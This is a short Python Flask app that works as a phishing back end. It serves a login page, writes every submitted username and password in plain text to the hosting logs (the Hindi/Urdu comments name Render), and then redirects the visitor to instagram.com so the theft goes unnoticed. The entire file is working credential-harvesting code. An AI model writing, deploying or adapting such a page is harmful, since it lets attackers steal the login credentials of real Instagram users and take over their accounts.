from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Ye data ko Render ke logs mein dikhayega
    # Is baar hum simple print use kar rahe hain
    print(f"--- LOGIN ---")
    print(f"USER: {username}")
    print(f"PASS: {password}")
    print(f"-------------")
    
    return redirect("https://www.instagram.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
